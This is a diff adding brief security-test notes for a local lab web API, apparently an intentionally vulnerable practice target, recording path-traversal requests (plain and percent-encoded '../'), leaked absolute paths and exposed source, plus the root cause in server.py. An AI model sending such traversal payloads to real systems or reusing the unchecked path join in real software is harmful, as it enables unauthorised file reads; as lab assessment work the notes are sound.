@@ -1,0 +1,19 @@
+Base dir = C:\Users\Administrator\Documents\GitHub\helm-pi\labs\weblab-api\
+Reads deliberately bounded to this repo's labs/ tree; no out-of-repo files touched.
+
+GET /files                       -> 404 {"error": "[Errno 2] No such file or directory: 'C:\\\\Users\\\\Administrator\\\\Documents\\\\GitHub\\\\helm-pi\\\\labs\\\\weblab-api\\\\readme.txt'"}
+     ^ default name + full absolute path leaked in error (info disclosure)
+
+GET /files?name=server.py        -> 200 full source returned (read 500 chars) incl. USERS/NOTES/FLAG constants
+
+Traversal out of base dir:
+GET /files?name=../README.md     -> 200 {"name": "../README.md", "content": "# labs — 本地授权靶场\n\n> 仅绑定 127.0.0.1。仅用于授权本地测试与 helm-pi ..."}
+     ^ escaped the intended directory => ../ not normalized/rejected
+
+Percent-encoded variant also accepted (200):
+GET /files?name=%2e%2e%2fREADME.md -> 200
+
+Negative control:
+GET /files?name=does_not_exist.txt -> 404 error with absolute path (confirms join against base dir)
+
+Root cause (labs/weblab-api/server.py): name = unquote(q.get("name")); path = os.path.join(os.path.dirname(__file__), name); open(path) — no realpath/commonpath containment check.
